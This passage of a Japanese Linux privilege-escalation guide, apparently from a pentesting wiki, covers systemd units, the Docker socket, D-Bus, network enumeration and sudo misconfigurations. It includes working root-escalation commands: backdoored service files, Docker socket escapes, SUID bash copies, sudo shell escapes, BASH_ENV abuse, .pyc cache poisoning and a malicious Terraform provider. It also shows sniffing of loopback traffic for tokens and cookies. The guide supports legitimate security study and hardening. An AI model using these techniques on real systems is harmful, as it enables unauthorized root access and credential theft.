任意の `.service` ファイルに書き込み可能か確認してください。可能であれば、そのファイルを変更して、サービスの**起動**時、**再起動**時、または**停止**時に backdoor を**実行**させることができます（マシンが再起動されるまで待つ必要があるかもしれません）。\
たとえば、.service ファイル内に **`ExecStart=/tmp/script.sh`** を指定して backdoor を作成します。

### 書き込み可能なサービスバイナリ

サービスによって実行されるバイナリに対する**書き込み権限**がある場合、それらを backdoor に置き換えることができます。サービスが再実行されると、backdoor が実行されます。

### systemd PATH - 相対パス

**systemd** が使用する PATH は、次の方法で確認できます。

```bash
systemctl show-environment
```

パス内のいずれかのフォルダに**書き込み**できる場合、**権限昇格**できる可能性があります。次のようなサービス設定ファイルで使用されている**相対パス**を探してください：

```bash
ExecStart=faraday-server
ExecStart=/bin/sh -ec 'ifup --allow=hotplug %I; ifquery --state %I'
ExecStop=/bin/sh "uptux-vuln-bin3 -stuff -hello"
```

次に、書き込み可能な systemd PATH フォルダー内に、相対パスのバイナリと**同じ名前の実行可能ファイル**を作成します。サービスが脆弱なアクション（**Start**、**Stop**、**Reload**）を実行するよう要求されると、**backdoorが実行されます**（通常、権限のないユーザーはサービスを起動／停止できませんが、`sudo -l`で実行できるか確認してください）。

**サービスについて詳しくは、`man systemd.service`を参照してください。**

## **Timers**

**Timers**は、`**.timer**`で終わる名前のsystemdユニットファイルで、`**.service**`ファイルやイベントを制御します。**Timers**はcronの代わりに使用できます。カレンダー時刻イベントと単調時刻イベントが組み込まれており、非同期で実行できます。

次のコマンドですべてのタイマーを列挙できます：

```bash
systemctl list-timers --all
```

### 書き込み可能な timers

timer を変更できる場合、既存の systemd.unit（`.service` や `.target` など）を実行させることができます。

```bash
Unit=backdoor.service
```

ドキュメントでは、Unitについて次のように説明されています。

> タイマーの期限が切れたときに有効化するユニットです。引数には、接尾辞が「.timer」ではないユニット名を指定します。指定しない場合、この値はタイマーユニットと同じ名前で、接尾辞を除いたサービスになります（上記参照）。有効化されるユニット名とタイマーユニット名は、接尾辞を除いて同じ名前にすることが推奨されています。

したがって、この権限を悪用するには、次のものが必要です。

- **書き込み可能なバイナリを実行している** systemdユニット（`.service`など）を見つける
- **相対パスを実行している** systemdユニットを見つけ、その実行ファイルになりすますために、**systemd PATH**への書き込み権限を持つ

**タイマーについて詳しくは、`man systemd.timer`を参照してください。**

### **タイマーの有効化**

タイマーを有効にするには、root権限で次のコマンドを実行する必要があります。

```bash
sudo systemctl enable backu2.timer
Created symlink /etc/systemd/system/multi-user.target.wants/backu2.timer → /lib/systemd/system/backu2.timer.
```

`timer` は `/etc/systemd/system/<WantedBy_section>.wants/<name>.timer` にシンボリックリンクを作成すると **有効化**される点に注意してください。

## ソケット

Unix Domain Sockets (UDS) は、クライアントサーバーモデルで同一または異なるマシン上の**プロセス間通信**を可能にします。コンピューター間通信には標準の Unix descriptor files を使用し、`.socket` ファイルを通じて設定します。<sup>[[14]](#references)</sup>

ソケットは `.socket` ファイルを使用して設定できます。

**ソケットの詳細については `man systemd.socket` を参照してください。** このファイルでは、いくつかの興味深いパラメーターを設定できます。

- `ListenStream`、`ListenDatagram`、`ListenSequentialPacket`、`ListenFIFO`、`ListenSpecial`、`ListenNetlink`、`ListenMessageQueue`、`ListenUSBFunction`: これらのオプションはそれぞれ異なりますが、ソケットが**どこで待ち受けるか**（AF_UNIX ソケットファイルのパス、待ち受ける IPv4/6 アドレスやポート番号など）を指定します。
- `Accept`: boolean 引数を取ります。**true** の場合、**着信接続ごとに service instance が起動**され、接続ソケットのみが渡されます。**false** の場合、待ち受けているソケット自体がすべて**起動した service unit に渡され**、すべての接続に対して service unit が1つだけ起動されます。データグラムソケットと FIFO ではこの値は無視され、着信トラフィックはすべて常に1つの service unit で処理されます。デフォルトは **false** です。パフォーマンス上の理由から、新しい daemon は `Accept=no` に適した方法でのみ作成することが推奨されます。
- `ExecStartPre`、`ExecStartPost`: 1つ以上のコマンドラインを指定します。それぞれ、待ち受けソケット/FIFO の**作成と bind の前**または**後**に実行されます。コマンドラインの最初のトークンは絶対ファイル名で、その後にプロセスの引数が続きます。
- `ExecStopPre`、`ExecStopPost`: 待ち受けソケット/FIFO の**クローズと削除の前**または**後**に実行される追加の**コマンド**です。
- `Service`: **着信トラフィック**で**有効化する**service unit 名を指定します。この設定は `Accept=no` のソケットでのみ使用できます。デフォルトでは、ソケットと同じ名前（サフィックスは置き換えられます）の service が指定されます。ほとんどの場合、このオプションを使用する必要はありません。

### 書き込み可能な .socket ファイル

**書き込み可能な** `.socket` ファイルが見つかった場合、`[Socket]` セクションの先頭に `ExecStartPre=/home/kali/sys/backdoor` のような行を**追加**できます。すると、ソケットが作成される前に backdoor が実行されます。そのため、**マシンが再起動されるまで待つ必要があるでしょう。**\
_システムがそのソケットファイルの設定を使用していなければ、backdoor は実行されない点に注意してください_

### ソケットの有効化 + 書き込み可能な unit path（service の新規作成）

影響の大きい設定ミスには、次のようなものもあります。

- `Accept=no` で `Service=<name>.service` を指定した socket unit
- 参照先の service unit が存在しない
- 攻撃者が `/etc/systemd/system`（または別の unit search path）に書き込める

この場合、攻撃者は `<name>.service` を作成し、ソケットにトラフィックを送信することで、systemd に新しい service を root として読み込ませ、実行させることができます。

手順の概要:

```bash
systemctl cat vuln.socket
# [Socket]
# Accept=no
# Service=vuln.service
```

```bash
cat >/etc/systemd/system/vuln.service <<'EOF'
[Service]
Type=oneshot
ExecStart=/bin/bash -c 'cp /bin/bash /var/tmp/rootbash && chmod 4755 /var/tmp/rootbash'
EOF
nc -q0 127.0.0.1 9999
/var/tmp/rootbash -p
```

### 書き込み可能なソケット

**書き込み可能なソケットを特定した場合**（ここでは Unix Sockets のことを指しており、設定用の `.socket` ファイルのことではありません）、そのソケットと**通信できる**ため、脆弱性を悪用できる可能性があります。

### Unix Sockets の列挙

```bash
netstat -a -p --unix
```

### 生の接続

```bash
#apt-get install netcat-openbsd
nc -U /tmp/socket  #Connect to UNIX-domain stream socket
nc -uU /tmp/socket #Connect to UNIX-domain datagram socket

#apt-get install socat
socat - UNIX-CLIENT:/dev/socket #connect to UNIX-domain socket, irrespective of its type
```

**悪用例:**


{{#ref}}
../../network-information/socket-command-injection.md
{{#endref}}

### HTTP ソケット

HTTP リクエストを待ち受けている**ソケット**がある場合があります（`.socket` ファイルではなく、unix ソケットとして機能するファイルのことです）。次の方法で確認できます。

```bash
curl --max-time 2 --unix-socket /path/to/socket/file http://localhost/
```

ソケットが**HTTP**リクエストに応答する場合、そのソケットと**通信**でき、場合によっては**脆弱性を exploit**できる可能性があります。

### 書き込み可能な Docker Socket

Docker Socket（多くの場合 `/var/run/docker.sock` にあります）は、保護すべき重要なファイルです。デフォルトでは、`root` ユーザーと `docker` グループのメンバーが書き込み可能です。このソケットへの書き込みアクセス権があると、Privilege Escalationにつながる可能性があります。以下では、その方法と、Docker CLIが利用できない場合の代替手段について説明します。

#### **Docker CLIを使った Privilege Escalation**

Docker Socketへの書き込みアクセス権がある場合、以下のコマンドを使ってPrivilege Escalationできます。<sup>[[15]](#references)</sup>

```bash
docker -H unix:///var/run/docker.sock run -v /:/host -it ubuntu chroot /host /bin/bash
docker -H unix:///var/run/docker.sock run -it --privileged --pid=host debian nsenter -t 1 -m -u -n -i sh
```

これらのコマンドを使うと、ホストのファイルシステムに root 権限でアクセスできるコンテナを実行できます。

#### **Docker APIを直接利用する**

Docker CLI が利用できない場合でも、Unix ソケット経由で生の HTTP を使えば、Docker socket を悪用できます。最も確実な手順は次のとおりです。

- ホストの root を bind mount した、長時間稼働する補助コンテナを作成する
- コンテナを起動する
- 補助コンテナ内に `exec` インスタンスを作成する
- `exec` インスタンスを起動し、API 経由で出力を読み取る

**Docker イメージを一覧表示する**

```bash
curl --unix-socket /var/run/docker.sock http://localhost/images/json
```

**ヘルパーコンテナを作成して起動する**

```bash
HELPER=helper

curl --unix-socket /var/run/docker.sock \
  -H "Content-Type: application/json" \
  -d '{"Image":"alpine:3.20","Cmd":["sleep","99999"],"HostConfig":{"Binds":["/:/host"]}}' \
  "http://localhost/v1.47/containers/create?name=${HELPER}"

curl --unix-socket /var/run/docker.sock \
  -X POST "http://localhost/v1.47/containers/${HELPER}/start"
```

**exec インスタンスを作成する**

```bash
EXEC_ID=$(
  curl -s --unix-socket /var/run/docker.sock \
    -H "Content-Type: application/json" \
    -d '{"AttachStdout":true,"AttachStderr":true,"Tty":true,"Cmd":["sh","-lc","find /host/root -maxdepth 1 -type f"]}' \
    "http://localhost/v1.47/containers/${HELPER}/exec" \
  | tr -d '\n' \
  | sed -n 's/.*"Id":"\([^"]*\)".*/\1/p'
)
```

**execインスタンスを起動して出力を読み取る**

```bash
curl --unix-socket /var/run/docker.sock \
  -H "Content-Type: application/json" \
  -d '{"Detach":false,"Tty":true}' \
  "http://localhost/v1.47/exec/${EXEC_ID}/start"
```

このパターンは通常、`socat` や `nc -U` を使って手動で `attach` を操作するよりも堅牢です。`/:/host` を使ってヘルパーを作成できれば、追加の `exec` インスタンスを使って `/host/root/...` などのファイルを読み取ったり、`/host/root/.ssh` に SSH keys を追加したり、ホストの起動ファイルを変更したりできます。

### その他

**`docker` グループ内にいる**ために Docker socket への書き込み権限がある場合は、[**権限昇格の方法が他にもあります**](../../user-information/interesting-groups-linux-pe/index.html#docker-group)。[**Docker API がポートでリッスンしている**場合は、それを侵害できる可能性もあります](../../../network-services-pentesting/2375-pentesting-docker.md#compromising)。

**コンテナから脱出したり、コンテナランタイムを悪用して権限昇格したりする方法**については、こちらをご覧ください:


{{#ref}}
../../containers-namespaces/container-security/
{{#endref}}

## Containerd (ctr) の権限昇格

**`ctr`** コマンドを使用できる場合は、以下のページを読んでください。**これを悪用して権限昇格できる可能性があります**:


{{#ref}}
../../containers-namespaces/containerd-ctr-privilege-escalation.md
{{#endref}}

## **RunC** の権限昇格

**`runc`** コマンドを使用できる場合は、以下のページを読んでください。**これを悪用して権限昇格できる可能性があります**:


{{#ref}}
../../containers-namespaces/runc-privilege-escalation.md
{{#endref}}

## **D-Bus**

D-Bus は、高度な**プロセス間通信（IPC）システム**であり、アプリケーションが効率よく相互に通信し、データを共有できるようにします。最新の Linux システムを念頭に設計されており、さまざまな形式のアプリケーション通信に対応する堅牢なフレームワークを提供します。<sup>[[16]](#references)</sup>

このシステムは柔軟性が高く、プロセス間のデータ交換を強化する基本的な IPC に対応しています。これは**拡張された UNIX domain socket**を想起させるものです。また、イベントやシグナルのブロードキャストにも役立ち、システムコンポーネント間のシームレスな連携を促進します。たとえば、Bluetooth daemon から着信を知らせるシグナルを受け取った音楽プレイヤーがミュートされ、ユーザー体験を向上できます。さらに、D-Bus はリモートオブジェクトシステムにも対応しており、アプリケーション間のサービス要求やメソッド呼び出しを簡素化し、従来は複雑だったプロセスを効率化します。

D-Bus は**許可／拒否モデル**で動作し、一致するポリシールールの累積的な効果に基づいて、メッセージの権限（メソッド呼び出し、シグナルの送信など）を管理します。これらのポリシーはバスとのやり取りを指定するもので、権限を悪用して権限昇格につながる可能性があります。

`/etc/dbus-1/system.d/wpa_supplicant.conf` にあるポリシーの例を示します。このポリシーでは、root ユーザーが `fi.w1.wpa_supplicant1` を所有し、同宛てにメッセージを送信し、同ユーザーからメッセージを受信する権限が詳しく指定されています。

ユーザーやグループが指定されていないポリシーはすべてに適用されます。一方、「default」コンテキストのポリシーは、他の具体的なポリシーで対象になっていないすべてに適用されます。

```xml
<policy user="root">
    <allow own="fi.w1.wpa_supplicant1"/>
    <allow send_destination="fi.w1.wpa_supplicant1"/>
    <allow send_interface="fi.w1.wpa_supplicant1"/>
    <allow receive_sender="fi.w1.wpa_supplicant1" receive_type="signal"/>
</policy>
```

**D-Bus 通信を列挙して exploit する方法はこちら：**


{{#ref}}
../../processes-crontab-systemd-dbus/d-bus-enumeration-and-command-injection-privilege-escalation.md
{{#endref}}

## **ネットワーク**

ネットワークを列挙して、マシンがどのような位置にあるのかを把握するのは、常に興味深いことです。

### 一般的な列挙

```bash
#Hostname, hosts and DNS
cat /etc/hostname /etc/hosts /etc/resolv.conf
dnsdomainname

#NSS resolution order (hosts file vs DNS)
grep -E '^(hosts|networks):' /etc/nsswitch.conf
getent hosts localhost

#Content of /etc/inetd.conf & /etc/xinetd.conf
cat /etc/inetd.conf /etc/xinetd.conf

#Interfaces
cat /etc/networks
(ifconfig || ip a)
(ip -br addr || ip addr show)

#Routes and policy routing (pivot paths)
ip route
ip -6 route
ip rule
ip route get 1.1.1.1

#L2 neighbours
(arp -e || arp -a || ip neigh)

#Neighbours
(arp -e || arp -a)
(route || ip n)

#L2 topology (VLANs/bridges/bonds)
ip -d link
bridge link 2>/dev/null

#Network namespaces (hidden interfaces/routes in containers)
ip netns list 2>/dev/null
ls /var/run/netns/ 2>/dev/null
nsenter --net=/proc/1/ns/net ip a 2>/dev/null

#Iptables rules
(timeout 1 iptables -L 2>/dev/null; cat /etc/iptables/* | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null)

#nftables and firewall wrappers (modern hosts)
sudo nft list ruleset 2>/dev/null
sudo nft list ruleset -a 2>/dev/null
sudo ufw status verbose 2>/dev/null
sudo firewall-cmd --state 2>/dev/null
sudo firewall-cmd --list-all 2>/dev/null

#Forwarding / asymmetric routing / conntrack state
sysctl net.ipv4.ip_forward net.ipv6.conf.all.forwarding net.ipv4.conf.all.rp_filter 2>/dev/null
sudo conntrack -L 2>/dev/null | head -n 20

#Files used by network services
lsof -i
```

ホストで有効な `/etc/inetd.conf` エントリが GNU Inetutils `telnetd` を root として実行している場合、ポートがループバックにのみ bind されている場合でも、設定されたバイナリのバージョンとローカルのリスナーを確認してください。GNU Inetutils 1.9.3 から 2.7 には、クライアントが指定した `USER` が `login -f` に渡される[telnet の認証バイパス](https://seclists.org/oss-sec/2026/q1/89)がありました（CVE-2026-24061）。プロセスやバージョン文字列は兆候にすぎません。露出していると判断する前に、ベンダーのパッチ適用状況と実際のデーモンを確認してください。[Telnet ガイド](../../../network-services-pentesting/pentesting-telnet.md)に詳細があります。

### Outbound filtering の簡易トリアージ

ホストでコマンドを実行できるものの callback が失敗する場合は、DNS、トランスポート、プロキシ、ルートの各フィルタリングを迅速に切り分けてください:

```bash
# DNS over UDP and TCP (TCP fallback often survives UDP/53 filters)
dig +time=2 +tries=1 @1.1.1.1 google.com A
dig +tcp +time=2 +tries=1 @1.1.1.1 google.com A

# Common outbound ports
for p in 22 25 53 80 443 587 8080 8443; do nc -vz -w3 example.org "$p"; done

# Route/path clue for 443 filtering
sudo traceroute -T -p 443 example.org 2>/dev/null || true

# Proxy-enforced environments and remote-DNS SOCKS testing
env | grep -iE '^(http|https|ftp|all)_proxy|no_proxy'
curl --socks5-hostname <ip>:1080 https://ifconfig.me
```

### 開放ポート

アクセスする前に操作できなかったマシン上で稼働しているネットワークサービスを、必ず確認してください。

```bash
(netstat -punta || ss --ntpu)
(netstat -punta || ss --ntpu) | grep "127.0"
ss -tulpn
#Quick view of local bind addresses (great for hidden/isolated interfaces)
ss -tulpn | awk '{print $5}' | sort -u
```

リスナーをバインド先で分類します。

- `0.0.0.0` / `[::]`: すべてのローカルインターフェースで公開されています。
- `127.0.0.1` / `::1`: ローカルからのみアクセス可能です（tunnel/forward の候補として適しています）。
- 特定の内部 IP（例: `10.x`、`172.16/12`、`192.168.x`、`fe80::`）: 通常、内部セグメントからのみ到達できます。

### ローカル限定サービスのトリアージ手順

ホストを侵害すると、`127.0.0.1` にバインドされたサービスに、初めてシェルからアクセスできることがよくあります。手早く調査するには、次の手順を使います。

```bash
# 1) Find local listeners
ss -tulnp

# 2) Discover open localhost TCP ports
nmap -Pn --open -p- 127.0.0.1

# 3) Fingerprint only discovered ports
nmap -Pn -sV -p <ports> 127.0.0.1

# 4) Manually interact / banner grab
nc 127.0.0.1 <port>
printf 'HELP\r\n' | nc 127.0.0.1 <port>
```

### LinPEAS をネットワークスキャナーとして使用する（ネットワーク専用モード）

ローカルの PE チェックに加えて、linPEAS は対象を絞ったネットワークスキャナーとして実行できます。`$PATH` 内で利用可能なバイナリ（通常は `fping`、`ping`、`nc`、`ncat`）を使用し、ツールをインストールしません。

```bash
# Auto-discover subnets + hosts + quick ports
./linpeas.sh -t

# Host discovery in CIDR
./linpeas.sh -d 10.10.10.0/24

# Host discovery + custom ports
./linpeas.sh -d 10.10.10.0/24 -p 22,80,443

# Scan one IP (default/common ports)
./linpeas.sh -i 10.10.10.20

# Scan one IP with selected ports
./linpeas.sh -i 10.10.10.20 -p 21,22,80,443
```

`-t` を指定せずに `-d`、`-p`、または `-i` を指定すると、linPEAS は純粋なネットワークスキャナーとして動作します（残りの権限昇格チェックはスキップされます）。

### Sniffing

トラフィックをスニッフィングできるか確認してください。可能であれば、認証情報を取得できる場合があります。

```
timeout 1 tcpdump
```

手早く実践できる確認事項:

```bash
#Can I capture without full sudo?
which dumpcap && getcap "$(which dumpcap)"

#Find capture interfaces
tcpdump -D
ip -br addr
```

Loopback（`lo`）は、内部専用のサービスがそこでトークン、Cookie、認証情報を公開していることが多いため、post-exploitationで特に価値があります。

```bash
sudo tcpdump -i lo -s 0 -A -n 'tcp port 80 or 8000 or 8080' \
  | egrep -i 'authorization:|cookie:|set-cookie:|x-api-key|bearer|token|csrf'
```

今キャプチャして、後で解析する：

```bash
sudo tcpdump -i any -s 0 -n -w /tmp/capture.pcap
tshark -r /tmp/capture.pcap -Y http.request \
  -T fields -e frame.time -e ip.src -e http.host -e http.request.uri
```

## ユーザー

### 一般的な Enumeration

自分が**誰**なのか、どのような**権限**を持っているのか、システムにどの**ユーザー**がいるのか、どのユーザーが**login**できるのか、そしてどのユーザーが**root権限**を持っているのかを確認します。

```bash
#Info about me
id || (whoami && groups) 2>/dev/null
#List all users
cat /etc/passwd | cut -d: -f1
#List users with console
cat /etc/passwd | grep "sh$"
#List superusers
awk -F: '($3 == "0") {print}' /etc/passwd
#Currently logged users
who
w
#Only usernames
users
#Login history
last | tail
#Last log of each user
lastlog2 2>/dev/null || lastlog

#List all users and their groups
for i in $(cut -d":" -f1 /etc/passwd 2>/dev/null);do id $i;done 2>/dev/null | sort
#Current user PGP keys
gpg --list-keys 2>/dev/null
```

### Big UID

一部の Linux バージョンは、**UID > INT_MAX** のユーザーが権限昇格できるバグの影響を受けていました。詳細: [こちら](https://gitlab.freedesktop.org/polkit/polkit/issues/74)、[こちら](https://github.com/mirchr/security-research/blob/master/vulnerabilities/CVE-2018-19788.sh)、[こちら](https://twitter.com/paragonsec/status/1071152249529884674)。<sup>[[33]](#references)[[34]](#references)[[35]](#references)</sup>\
次のコマンドで **exploit** できます: **`systemd-run -t /bin/bash`**

### Groups

root 権限を付与する可能性のある**グループに所属しているか**確認してください:


{{#ref}}
../../user-information/interesting-groups-linux-pe/
{{#endref}}

### Clipboard

クリップボードに興味深い内容がないか確認してください（可能な場合）。

```bash
if [ `which xclip 2>/dev/null` ]; then
    echo "Clipboard: "`xclip -o -selection clipboard 2>/dev/null`
    echo "Highlighted text: "`xclip -o 2>/dev/null`
  elif [ `which xsel 2>/dev/null` ]; then
    echo "Clipboard: "`xsel -ob 2>/dev/null`
    echo "Highlighted text: "`xsel -o 2>/dev/null`
  else echo "Not found xsel and xclip"
  fi
```

### パスワードポリシー

```bash
grep "^PASS_MAX_DAYS\|^PASS_MIN_DAYS\|^PASS_WARN_AGE\|^ENCRYPT_METHOD" /etc/login.defs
```

### 既知のパスワード

環境内の**いずれかのパスワードが分かっている**場合は、そのパスワードを使って各ユーザーとしてログインを試してください。

### Su Brute

大量のノイズが発生しても構わず、コンピューターに `su` と `timeout` のバイナリがある場合は、[su-bruteforce](https://github.com/carlospolop/su-bruteforce) を使ってユーザーの brute-force を試せます。\
[**Linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) も、`-a` パラメーターを指定するとユーザーの brute-force を試みます。

## 書き込み可能な PATH の悪用

### $PATH

**$PATH 内のフォルダーに書き込み可能**であることが分かった場合、書き込み可能なフォルダー内に、別のユーザー（理想的には root）が実行するコマンドと同じ名前の backdoor を作成して、権限昇格できる可能性があります。ただし、そのコマンドが $PATH 内で書き込み可能なフォルダーより前にあるフォルダーから読み込まれないことが条件です。

### SUDO と SUID

sudo を使ってコマンドを実行できる場合や、そのコマンドに SUID ビットが設定されている場合があります。次の方法で確認してください。

```bash
sudo -l #Check commands you can execute with sudo
find / -perm -4000 2>/dev/null #Find all SUID binaries
```

一部の**想定外のコマンドでは、ファイルの読み取りや書き込み、さらにはコマンドの実行まで可能です**。<sup>[[8]](#references)</sup> 例えば：

```bash
sudo awk 'BEGIN {system("/bin/sh")}'
sudo find /etc -exec sh -i \;
sudo tcpdump -n -i lo -G1 -w /dev/null -z ./runme.sh
sudo tar c a.tar -I ./runme.sh a
ftp>!/bin/sh
less>! <shell_comand>
```

### NOPASSWD

Sudoの設定によっては、ユーザーがパスワードを知らなくても、別のユーザーの権限で一部のコマンドを実行できる場合があります。

```
$ sudo -l
User demo may run the following commands on crashlab:
    (root) NOPASSWD: /usr/bin/vim
```

この例では、ユーザー `demo` は `root` として `vim` を実行できるため、root ディレクトリに ssh key を追加するか、`sh` を呼び出すだけで簡単に shell を取得できます。

```
sudo vim -c '!sh'
```

### sudoスクリプト内のクォートされていないBash比較

Bashでは、`[[ "$protected" == $candidate ]]` の右辺はパターンです。root権限で実行可能なsudoスクリプトが、呼び出し元が制御できるファイルから `candidate` に値を設定する場合、`prefix*` のような値は保護対象の文字列の先頭部分に一致することがあります。成功時とエラー時で異なる処理経路があると、prefix oracleが露呈する可能性があります。文字列の完全一致を意図する場合は、右辺をクォートしてください（`[[ "$protected" == "$candidate" ]]`）。クォートされていない比較が悪用可能か判断する前に、実際のsudo引数、入力元、外部から観測可能な分岐動作を確認してください。[GNU Bash manual](https://www.gnu.org/software/bash/manual/html_node/Conditional-Constructs.html)では、このパターンの動作が定義されています。

### sudoでのPrusaSlicerプロジェクトファイル

呼び出し元がスライス対象の `.3mf` プロジェクトを選択できる場合、`prusaslicer` または `prusa-slicer` に対する制限のないroot権限でのsudo許可は、確認が必要です。プロジェクトには、G-codeのエクスポート時に実行される後処理スクリプトを含めることができます。細工されたプロジェクトは、2.6.1までのPrusaSlicer内でコマンドを実行できる可能性があります（[CVE-2023-47268](https://security-tracker.debian.org/tracker/CVE-2023-47268)）。権限境界を越えた実行が可能と結論づける前に、有効なsudoルール、バイナリのバージョンとベンダーのパッチ、プロジェクトの入手元、該当するエクスポート処理が実行されるかを確認してください。固定されたプロジェクト引数や有効な `NOEXEC` ポリシーによって、結果が変わる場合があります。スライサーがインストールされていることだけでは、権限昇格の経路が存在するとは言えません。

### SETENV

このディレクティブにより、ユーザーは何かを実行するときに**環境変数を設定**できます。

```bash
$ sudo -l
User waldo may run the following commands on admirer:
    (ALL) SETENV: /opt/scripts/admin_tasks.sh
```

この例は**HTB machine Admirerに基づいており**、rootとしてスクリプトを実行する際に任意のPythonライブラリを読み込む**PYTHONPATH hijacking**に対して**脆弱でした**。

```bash
sudo PYTHONPATH=/dev/shm/ /opt/scripts/admin_tasks.sh
```

### sudo で実行可能な Python の import における書き込み可能な `__pycache__` / `.pyc` poisoning

**sudo で実行可能な Python スクリプト**が、パッケージディレクトリ内に**書き込み可能な `__pycache__`**があるモジュールを import する場合、キャッシュされた `.pyc` を置き換えて、次回の import 時に特権ユーザーとして code execution を得られる可能性があります。<sup>[[30]](#references)</sup>

- 仕組み:
  - CPython はバイトコードキャッシュを `__pycache__/module.cpython-<ver>.pyc` に保存します。<sup>[[31]](#references)</sup>
  - インタープリターは**ヘッダー**（magic と、ソースに紐づくタイムスタンプまたはハッシュのメタデータ）を検証し、その後、ヘッダーの後に保存された marshal 化済みコードオブジェクトを実行します。
  - ディレクトリが書き込み可能で、キャッシュファイルを**削除して再作成**できる場合、root 所有で書き込み不可の `.pyc` でも置き換えられます。
- よくあるパス:
  - `sudo -l` に、root として実行できる Python スクリプトまたはラッパーが表示される。
  - そのスクリプトが `/opt/app/`、`/usr/local/lib/...` などからローカルモジュールを import する。
  - import されるモジュールの `__pycache__` ディレクトリが、ユーザーまたは全ユーザーに対して書き込み可能になっている。

簡単な列挙:

```bash
sudo -l
find / -type d -name __pycache__ -writable 2>/dev/null
find / -type f -path '*/__pycache__/*.pyc' -ls 2>/dev/null
```

特権スクリプトを調査できる場合は、インポートされるモジュールとそのキャッシュパスを特定します。<sup>[[32]](#references)</sup>

```bash
grep -R "^import \\|^from " /opt/target/ 2>/dev/null
python3 - <<'PY'
import importlib.util
spec = importlib.util.find_spec("target_module")
print(spec.origin)
print(spec.cached)
PY
```

悪用の手順:

1. sudo 実行が許可されたスクリプトを一度実行し、Python に正規の cache ファイルを作成させます（まだ存在しない場合）。
2. 正規の `.pyc` から先頭の16バイトを読み取り、poisoned file で再利用します。
3. payload の code object をコンパイルし、`marshal.dumps(...)` でシリアライズして、元の cache ファイルを削除します。その後、元の header と悪意のある bytecode を組み合わせてファイルを再作成します。
4. sudo 実行が許可されたスクリプトを再実行し、import 時に payload を root として実行させます。

重要な注意点:

- 元の header を再利用することが重要です。Python は cache metadata とソースファイルを照合しますが、bytecode の本体が実際にソースと一致するかどうかは確認しません。
- ソースファイルが root 所有で書き込み不可でも、格納先の `__pycache__` ディレクトリが書き込み可能な場合に特に有効です。
- `PYTHONDONTWRITEBYTECODE=1` と `python -B` は、Python が新しい `.pyc` ファイルを書き込むのを防ぎますが、攻撃者に置き換えられた既存の有効な cache を読み込むことまでは防ぎません。重要な境界は、低い権限のユーザーが、特権ユーザーの import で受け入れられる cache を置き換えられるかどうかです。Python は cache された bytecode を読み込む前に、timestamp/size または hash metadata を確認します。[Python import reference](https://docs.python.org/3.12/reference/import.html#cached-bytecode-invalidation) と [command-line documentation](https://docs.python.org/3.12/using/cmdline.html#envvar-PYTHONDONTWRITEBYTECODE) を参照してください。

最小限の proof-of-concept の構成:

```python
import marshal, pathlib, subprocess, tempfile

pyc = pathlib.Path("/opt/app/__pycache__/target.cpython-312.pyc")
header = pyc.read_bytes()[:16]
payload = "import os; os.system('cp /bin/bash /tmp/rbash && chmod 4755 /tmp/rbash')"

with tempfile.TemporaryDirectory() as d:
    src = pathlib.Path(d) / "x.py"
    src.write_text(payload)
    code = compile(src.read_text(), str(src), "exec")
    pyc.unlink()
    pyc.write_bytes(header + marshal.dumps(code))

subprocess.run(["sudo", "/opt/app/runner.py"])
```

Hardening:

- 特権ユーザーの Python import path 内に、低権限ユーザーが書き込み可能なディレクトリがないことを確認します。`__pycache__` も対象です。
- 既存の `.pyc` ファイルも含め、cache directory の所有者と権限を監査します。bytecode の書き込みを無効にすれば新たな cache の作成を減らせますが、置き換え可能な既存の cache は無効化されません。
- 書き込み可能なローカル Python モジュールや cache directory は、root が実行する書き込み可能な shell script や shared library と同じように扱います。

### sudo env_keep によって BASH_ENV が保持される場合 → root shell

sudoers が `BASH_ENV` を保持する場合（例: `Defaults env_keep+="ENV BASH_ENV"`）、許可されたコマンドの実行時に Bash の非対話型起動動作を利用して、root として任意のコードを実行できます。<sup>[[24]](#references)</sup>

- 仕組み: 非対話型 shell では、Bash は対象の script を実行する前に `$BASH_ENV` を評価し、そのファイルを source します。多くの sudo ルールでは、script や shell wrapper の実行が許可されています。`BASH_ENV` が sudo によって保持される場合、自分のファイルは root 権限で source されます。<sup>[[23]](#references)</sup>

- 要件:
  - 実行可能な sudo ルール（非対話型で `/bin/bash` を呼び出す対象、または任意の bash script）。
  - `BASH_ENV` が `env_keep` に含まれていること（`sudo -l` で確認）。

- PoC:

```bash
cat > /dev/shm/shell.sh <<'EOF'
#!/bin/bash
/bin/bash
EOF
chmod +x /dev/shm/shell.sh
BASH_ENV=/dev/shm/shell.sh sudo /usr/bin/systeminfo   # or any permitted script/binary that triggers bash
# You should now have a root shell
```

- Hardening:
  - `env_keep` から `BASH_ENV`（および `ENV`）を削除し、`env_reset` を優先する。
  - sudo で許可されたコマンドにシェルラッパーを使わず、最小限のバイナリを使う。
  - 保持された環境変数が使われた際に検知できるよう、sudo の I/O logging とアラートを検討する。

### sudo 経由の Terraform と保持された HOME（!env_reset）

sudo で、より高い権限を持つユーザーとして Terraform を実行できる場合、`!env_reset` は、そのルールで実際にどの環境変数が引き継がれるかを確認する手がかりになります。呼び出し元が書き込み可能な `.terraformrc` または `terraform.rc` が有効な CLI 設定として使われると判断する前に、実効的な `HOME` または `TF_CLI_CONFIG_FILE` を確認してください。`provider_installation.dev_overrides` エントリが意味を持つのは、固定された Terraform コマンドがその provider を読み込み、かつ呼び出し元が選択されたディレクトリに実行ファイルを配置できる場合に限られます。<sup>[[25]](#references)</sup>

- 必要な provider の参照先を、書き込み可能なディレクトリに設定し、provider 名を付けた悪意のあるプラグイン（例: `terraform-provider-examples`）を配置します。

```hcl
# ~/.terraformrc
provider_installation {
  dev_overrides {
    "previous.htb/terraform/examples" = "/dev/shm"
  }
  direct {}
}
```

```bash
cat >/dev/shm/terraform-provider-examples <<'EOF'
#!/bin/bash
cp /bin/bash /var/tmp/rootsh
chown root:root /var/tmp/rootsh
chmod 6777 /var/tmp/rootsh
EOF
chmod +x /dev/shm/terraform-provider-examples
sudo /usr/bin/terraform -chdir=/opt/examples apply
```

TerraformはGo plugin handshakeに失敗しますが、終了する前にpayloadをrootとして実行し、SUID shellを残します。

### TF_VAR overrides + symlink validation bypass

